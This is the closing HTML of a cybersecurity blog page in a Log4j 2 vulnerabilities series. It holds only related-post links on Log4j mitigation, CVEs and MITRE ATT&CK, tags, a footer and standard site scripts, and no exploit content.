col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/blog/log4j-part-iii/"><div class="card-body"><picture> <source srcset="/blog/images/featured/closed_windows.jpg_360 360w, /blog/images/featured/closed_windows.jpg_720 2x"> <source srcset="/blog/images/featured/closed_windows.jpg_720 720w, /blog/images/featured/closed_windows.jpg 2x"> <source srcset="/blog/images/featured/closed_windows.jpg"> <img class="thumbnail img-fluid" src="/blog/images/featured/closed_windows.jpg" alt="Log4j 2 vulnerabilities, part III: Prevention, mitigation and fixing"> </picture><br /> <span class="timeago small" >Jun 27<i class="unloaded">2023-06-27T23:45:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Log4j 2 vulnerabilities, part III: Prevention, mitigation and fixing</h3><div class="text-muted small"><p> Wow, more than a year without writing anything more, and even leaving a three-part blog post unfinished… So what happened? Well, I started a new job, which requires a lot of focus as the beginning...</p></div></div></a></div><div class="card"> <a href="/blog/what-is-a-cve/"><div class="card-body"><picture> <source srcset="/blog/images/featured/cyberpunk-cve.png_360 360w, /blog/images/featured/cyberpunk-cve.png_720 2x"> <source srcset="/blog/images/featured/cyberpunk-cve.png_720 720w, /blog/images/featured/cyberpunk-cve.png 2x"> <source srcset="/blog/images/featured/cyberpunk-cve.png"> <img class="thumbnail img-fluid" src="/blog/images/featured/cyberpunk-cve.png" alt="What is a CVE?"> </picture><br /> <span class="timeago small" >Dec 6, 2021<i class="unloaded">2021-12-06T05:20:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>What is a CVE?</h3><div class="text-muted small"><p> You are playing Cyberpunk 2077, and on the introductory mission, you have to steal a car. After using an electronic tool first to open its door, you get inside, and while the hijack takes place, a ...</p></div></div></a></div><div class="card"> <a href="/blog/intro-mitre-attack/"><div class="card-body"><picture> <source srcset="/blog/images/featured/mitre-attack-logo.png_360 360w, /blog/images/featured/mitre-attack-logo.png_720 2x"> <source srcset="/blog/images/featured/mitre-attack-logo.png_720 720w, /blog/images/featured/mitre-attack-logo.png 2x"> <source srcset="/blog/images/featured/mitre-attack-logo.png"> <img class="thumbnail img-fluid" src="/blog/images/featured/mitre-attack-logo.png" alt="Introduction to MITRE ATT&CK"> </picture><br /> <span class="timeago small" >Nov 25, 2021<i class="unloaded">2021-11-25T19:34:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Introduction to MITRE ATT&CK</h3><div class="text-muted small"><p> When you start working on cybersecurity, you for sure start seeing references to things like privilege escalation, lateral movement, or exfiltration continuously. As categories for security tools, ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/blog/log4j-part-i/" class="btn btn-outline-primary" prompt="Older"><p>Log4j 2 vulnerabilities, part I: History</p></a> <a href="/blog/log4j-part-iii/" class="btn btn-outline-primary" prompt="Newer"><p>Log4j 2 vulnerabilities, part III: Prevention, mitigation and fixing</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/v1z3n">Vicente Herrera</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">CC BY.</span></p></div><div class="footer-right"><p class="mb-0"></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/blog/tags/cybersecurity/">cybersecurity</a> <a class="post-tag" href="/blog/tags/cve/">CVE</a> <a class="post-tag" href="/blog/tags/security/">security</a> <a class="post-tag" href="/blog/tags/cve-2021-44228/">CVE 2021 44228</a> <a class="post-tag" href="/blog/tags/cve-2015-4902/">CVE‑2015‑4902</a> <a class="post-tag" href="/blog/tags/log4j/">Log4j</a> <a class="post-tag" href="/blog/tags/log4shell/">log4shell</a> <a class="post-tag" href="/blog/tags/rce/">RCE</a> <a class="post-tag" href="/blog/tags/remote-code-execution/">remote code execution</a> <a class="post-tag" href="/blog/tags/vulnerability/">vulnerability</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/blog/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/blog/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/blog/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-3J0T6C6HWL"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-3J0T6C6HWL'); }); </script>
